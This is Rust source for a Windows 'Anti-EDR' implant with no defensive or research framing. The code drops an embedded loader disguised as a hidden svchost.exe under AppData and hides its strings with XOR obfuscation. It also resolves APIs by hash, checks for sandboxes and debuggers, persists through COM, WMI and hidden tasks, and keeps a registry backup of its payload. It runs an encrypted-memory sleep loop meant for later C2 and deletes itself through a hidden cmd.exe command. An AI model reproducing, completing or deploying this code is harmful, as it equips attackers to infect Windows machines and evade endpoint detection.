//! # Windows Anti-EDR Engine
//!
//! Zero Artifacts, Zero Dependencies Anti-EDR system.
//!
//! ## Modules
//! - `syscalls` - Indirect syscalls (Gate Jumping)
//! - `ghosting` - Process ghosting (execute from deleted file)
//! - `obfuscation` - Sleep obfuscation (Ekko technique)
//! - `stack_spoof` - Call stack spoofing (synthetic frames)
//! - `persistence` - COM hijacking + WMI + hidden task
//! - `ads` - NTFS Alternate Data Streams storage

pub mod ads;
pub mod persistence;
pub mod ghosting;
pub mod obfuscation;
pub mod stack_spoof;
pub mod syscalls;
// pub mod blinding; // REMOVED - ETW/AMSI bypass is detection magnet
pub mod registry;
pub mod anti_analysis;
pub mod api_resolver;

use log::{info, warn, error, debug};

// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Initialize and apply Windows stealth measures
pub fn check_and_apply_stealth() {
    debug!("v3.1");

    // 0. Anti-Analysis - Exit if sandbox/debugger detected
    if anti_analysis::is_hostile_environment() {
        debug!("Hostile env detected - aborting");
        return;
    }

    // NOTE: ETW/AMSI Blinding REMOVED - detection risk too high for enterprise EDR
    // The code exists in blinding.rs but is never called = not compiled into binary
    
    // Check if already in ghost mode
    let is_ghost = std::env::args().any(|arg| arg == "--ghost");
    
    // Registry check handled by persistence/registry modules implicit robustness
    // Check if we are running from temp "service.exe" 
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // "service.exe" -> xor(0x55)
    // s=73^55=26, e=65^55=30, r=72^55=27, v=76^55=23, i=69^55=3C, c=63^55=36, .=2E^55=7B
    let svc_name = x(&[0x26, 0x30, 0x27, 0x23, 0x3C, 0x36, 0x30, 0x7B, 0x30, 0x2D, 0x30]); 
    let is_loader_execution = current_exe.to_string_lossy().to_lowercase().contains(&svc_name);
    
    if is_ghost || is_loader_execution {
        debug!("Mode: Ghost/Loader");
        run_ghost_mode();
        return;
    }
    
    debug!("Init install...");
    
    match install_stealth_package() {
        Ok(_) => {
            debug!("Installed");
            // schedule_self_destruct();
        }
        Err(e) => {
            error!("Fail: {}", e);
        }
    }
}

/// Install the stealth package (Using Native API - No std::fs imports)
fn install_stealth_package() -> Result<(), String> {
    // 0. Backup Payload to Registry (Encrypted)
    if let Ok(_) = registry::install_self_to_registry() {
        debug!("RegBackup OK");
    }

    // 1. Drop LOADER using Native API
    #[cfg(target_os = "windows")]
    const LOADER_BYTES: &[u8] = include_bytes!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../../target/x86_64-pc-windows-gnu/release/loader.exe"
    ));
    
    #[cfg(not(target_os = "windows"))]
    const LOADER_BYTES: &[u8] = &[0u8; 10];
    
    // Get APPDATA path
    let env_key = x(&[0x14, 0x05, 0x05, 0x11, 0x14, 0x01, 0x14]); // APPDATA
    let appdata = std::env::var(&env_key).unwrap_or_else(|_| r"C:\Windows\Temp".to_string());
    
    // Build path components (XOR obfuscated)
    let p1 = x(&[0x09, 0x18, 0x3C, 0x36, 0x27, 0x3A, 0x26, 0x3A, 0x33, 0x21]); // \Microsoft
    let p2 = x(&[0x09, 0x02, 0x3C, 0x3B, 0x31, 0x3A, 0x22, 0x26]); // \Windows
    let p3 = x(&[0x09, 0x01, 0x30, 0x38, 0x25, 0x39, 0x34, 0x21, 0x30, 0x26]); // \Templates
    
    let target_dir = format!("{}{}{}{}", appdata, p1, p2, p3);
    let loader_name = x(&[0x26, 0x23, 0x36, 0x3D, 0x3A, 0x26, 0x21, 0x7B, 0x30, 0x2D, 0x30]); // svchost.exe
    let target_path = format!("{}\\{}", target_dir, loader_name);
    
    // Use Native API for file operations
    #[cfg(target_os = "windows")]
    unsafe {
        use api_resolver::*;
        
        // Create directory using CreateDirectoryW
        if let Some(create_dir) = resolve_api::<unsafe extern "system" fn(*const u16, *const std::ffi::c_void) -> i32>(
            HASH_KERNEL32, HASH_CREATE_DIRECTORY_W
        ) {
            let dir_wide = to_wide(&target_dir);
            let _ = create_dir(dir_wide.as_ptr(), std::ptr::null());
        }
        
        // Write file using CreateFileW + WriteFile
        type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const std::ffi::c_void, u32, u32, isize) -> isize;
        type WriteFile = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const std::ffi::c_void) -> i32;
        type CloseHandle = unsafe extern "system" fn(isize) -> i32;
        
        let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
            .ok_or("Failed to resolve CreateFileW")?;
        let write_file: WriteFile = resolve_api(HASH_KERNEL32, HASH_WRITE_FILE)
            .ok_or("Failed to resolve WriteFile")?;
        let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
            .ok_or("Failed to resolve CloseHandle")?;
        
        let path_wide = to_wide(&target_path);
        
        // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2, FILE_ATTRIBUTE_NORMAL=0x80
        let handle = create_file(path_wide.as_ptr(), 0x40000000, 0, std::ptr::null(), 2, 0x80, 0);
        if handle == -1 {
            return Err("CreateFile failed".to_string());
        }
        
        let mut written: u32 = 0;
        let result = write_file(handle, LOADER_BYTES.as_ptr(), LOADER_BYTES.len() as u32, &mut written, std::ptr::null());
        close_handle(handle);
        
        if result == 0 {
            return Err("WriteFile failed".to_string());
        }
        
        // Set hidden+system attributes
        if let Some(set_attrs) = resolve_api::<unsafe extern "system" fn(*const u16, u32) -> i32>(
            HASH_KERNEL32, HASH_SET_FILE_ATTRIBUTES_W
        ) {
            // FILE_ATTRIBUTE_HIDDEN(2) | FILE_ATTRIBUTE_SYSTEM(4)
            set_attrs(path_wide.as_ptr(), 0x02 | 0x04);
        }
    }
    
    debug!("Loader dropped (native API)");
    
    // 2. Apply persistence
    persistence::apply_persistence_triad(&target_path);
    
    // 3. Self-delete
    schedule_self_destruct();
    
    Ok(())
}

/// Convert string to wide string (UTF-16) for Windows API
#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Run in ghost mode (already hidden)
fn run_ghost_mode() {
    debug!("Ghost initialized");
    
    // Verify syscall resolution
    if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {
        debug!("Syscalls OK: 0x{:04X}", sc.ssn);
    } else {
        warn!("Syscall fail");
        return;
    }
    
    // Main persistence loop with sleep obfuscation
    // Memory is encrypted while sleeping to evade memory scanners
    loop {
        // Sleep with obfuscation (encrypts .data/.rdata sections)
        unsafe {
            match obfuscation::obfuscated_sleep(30_000) { // 30 seconds
                Ok(_) => debug!("Sleep cycle OK"),
                Err(e) => {
                    warn!("Sleep obfuscation failed: {}", e);
                    // Fallback to regular sleep
                    std::thread::sleep(std::time::Duration::from_secs(30));
                }
            }
        }
        
        // Beacon heartbeat - currently no-op, C2 integration pending external implementation
        // This loop keeps process alive with encrypted memory during sleep cycles
    }
}

/// Schedule deletion of original installer using native API
fn schedule_self_destruct() {
    #[cfg(target_os = "windows")]
    unsafe {
        use api_resolver::*;
        
        // API types
        type GetModuleFileNameA = unsafe extern "system" fn(isize, *mut u8, u32) -> u32;
        type CreateProcessA = unsafe extern "system" fn(
            *const u8, *mut u8, *const std::ffi::c_void, *const std::ffi::c_void,
            i32, u32, *const std::ffi::c_void, *const u8,
            *const [u8; 68], *mut [u8; 24]
        ) -> i32;
        
        // Resolve APIs
        let get_mod_name: GetModuleFileNameA = match resolve_api(HASH_KERNEL32, HASH_GET_MODULE_FILE_NAME_A) {
            Some(f) => f,
            None => return,
        };
        let create_proc: CreateProcessA = match resolve_api(HASH_KERNEL32, HASH_CREATE_PROCESS_A) {
            Some(f) => f,
            None => return,
        };
        
        // Get own path
        let mut path = [0u8; 260];
        let len = get_mod_name(0, path.as_mut_ptr(), 260);
        if len == 0 { return; }
        
        let path_str = std::ffi::CStr::from_ptr(path.as_ptr() as *const i8)
            .to_string_lossy();
        
        // Build obfuscated command
        let cmd_name = x(&[0x36, 0x38, 0x31]); // cmd
        let del_cmd = format!(
            "{} /c ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
            cmd_name, path_str
        );
        
        let mut cmd_bytes: Vec<u8> = del_cmd.into_bytes();
        cmd_bytes.push(0);
        
        // STARTUPINFOA (simplified, 68 bytes on x64)
        let si = [0u8; 68];
        let mut pi = [0u8; 24]; // PROCESS_INFORMATION
        
        // CREATE_NO_WINDOW = 0x08000000
        create_proc(
            std::ptr::null(), cmd_bytes.as_mut_ptr(),
            std::ptr::null(), std::ptr::null(),
            0, 0x08000000,
            std::ptr::null(), std::ptr::null(),
            &si, &mut pi
        );
        
        debug!("Self-destruct scheduled (native)");
    }
}

